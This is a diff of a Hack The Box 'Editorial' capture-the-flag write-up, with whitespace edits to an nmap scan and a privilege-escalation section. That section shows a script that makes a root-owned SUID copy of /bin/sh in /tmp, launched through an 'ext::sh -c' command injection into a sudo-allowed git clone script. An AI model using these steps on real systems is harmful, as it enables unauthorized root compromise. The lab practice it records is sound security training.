@@ -1,4 +1,3 @@
-
 ## Host Scan
 
 ```bash
@@ -19,12 +18,10 @@ PORT   STATE SERVICE VERSION
 |_http-title: Did not follow redirect to http://editorial.htb
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
 Nmap done: 1 IP address (1 host up) scanned in 14.13 seconds
 
 ```
-
-
 
 ![[Challenge/HTB Challenge/Editorial/IMG/001.png]]
 
@@ -205,9 +202,17 @@ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext
 
 
 ```bash
-echo -e '#!/bin/bash\n\ncp /bin/sh /tmp/ice\nchown root:root /tmp/ice\nchmod 6777 /tmp/ice' 
+echo -e '#!/bin/bash
 
-echo -e '#!/bin/bash\n\ncp /bin/sh /tmp/ice\nchown root:root /tmp/ice\nchmod 6777 /tmp/ice' > /dev/shm/ice.sh 
+cp /bin/sh /tmp/ice
+chown root:root /tmp/ice
+chmod 6777 /tmp/ice'
+
+echo -e '#!/bin/bash
+
+cp /bin/sh /tmp/ice
+chown root:root /tmp/ice
+chmod 6777 /tmp/ice' > /dev/shm/ice.sh 
 
 chmod +x /dev/shm/ice.sh
 
@@ -219,3 +224,4 @@ sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /
 ```
 
 # PWNED 
+```
